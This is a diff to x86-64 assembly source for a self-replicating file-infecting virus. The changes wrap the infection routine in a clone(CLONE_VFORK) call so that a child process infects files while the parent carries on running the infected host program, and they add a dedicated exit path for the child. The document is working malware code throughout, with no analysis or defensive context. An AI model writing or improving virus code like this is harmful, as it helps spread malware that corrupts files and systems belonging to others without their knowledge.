@@ -31,9 +31,21 @@ begin:
 	mov rbp, rsp
 	sub rsp, %$localsize
 
+	mov rax, SYS_CLONE				; _pid = clone(
+	mov rdi, CLONE_VFORK				; 	CLONE_VFORK,
+	xor rsi, rsi					; 	0,
+	xor rdx, rdx					; 	0,
+	xor r10, r10					; 	0
+	syscall						; );
+	cmp rax, 0					; if (_pid < 0)
+	jl .skipped					; 	goto .skipped;
+	je .child					; else if (_pid == 0) goto .child;
+	jmp .skipped					; else goto .skipped;
+
+.child:
 	call can_run_infection				; if (can_run_infection() == 0)
-	cmp rax, 0					; 	goto .skipped;
-	je .skipped					; ...
+	cmp rax, 0					; 	goto exit;
+	je exit						; ...
 
 	; Set arguments of compression/decompression function
 	lea rdi, [compressed_data_size]			; _compressed_data_size_ptr = &compressed_data_size;
@@ -56,6 +68,7 @@ begin:
 	add rsi, COMPRESSION_BUF_SIZE			; /* Ugly thing because of arbitraty COMPRESSION_BUF_SIZE
 	sub rsi, rdi					; ... */
 	call infection_routine				; ...
+	jmp exit
 
 .skipped:
 	add rsp, %$localsize
@@ -456,6 +469,7 @@ decompression:
 jmp_instr:
 	db 0xe9, 00, 00, 00, 00				; jump to default behavior of infected file
 							; or to next instruction if original virus
+exit:
 	mov rax, SYS_EXIT				; exit(
 	xor rdi, rdi					; 0
 	syscall						; );
